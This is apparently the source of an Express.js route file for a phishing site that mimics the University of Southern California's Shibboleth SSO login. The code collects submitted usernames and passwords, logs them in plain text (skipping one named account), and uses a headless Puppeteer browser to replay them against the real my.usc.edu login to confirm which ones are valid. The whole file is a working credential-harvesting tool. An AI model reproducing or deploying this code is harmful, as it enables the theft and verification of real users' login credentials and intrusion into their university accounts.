var express = require('express');
var router = express.Router();
const logger = require('../utils/logger');
const puppeteer = require('puppeteer');
let browser;
/* GET home page. */
router.get('/', function (req, res, next) {
    res.redirect("/webapps/login")
});

router.get('/webapps/login', function (req, res, next) {
    res.render('index');
});

router.get('/idp/profile/SAML2/Redirect/SSO', function (req, res, next) {
    (async () => {
        browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-setuid-sandbox']});
        res.render('login');
    })();
});

router.post('/idp/profile/SAML2/Redirect/SSO/login', function (req, res, next) {
    var username = req.body.j_username;
    var password = req.body.j_password;
    if (username != "jdecaro") {
        logger.info(username);
        logger.info(password);
    }
    (async () => {
        try {
            const page = await browser.newPage();
            await page.goto('https://my.usc.edu', {waitUntil: 'networkidle'});
            await page.focus('input[id="username"]');
            await page.type(username);
            await page.focus('input[id="password"]');
            await page.type(password);
            await page.click('button[name="_eventId_proceed"]');
            console.log('here')
            //await page.waitForSelector('a[class="sign-out"]', {timeout: 4000});

            await page.waitForNavigation({waitUntil: 'networkidle'});
            let title = await page.title();
            console.log(title);
            if (title.indexOf('Shibboleth') !== -1) {
                res.status(500);
                res.end();
            } else {
                res.status(200);
                res.end();
            }
        } catch (e) {
            res.status(500);
            res.end();
        }

    })();


});

module.exports = router;
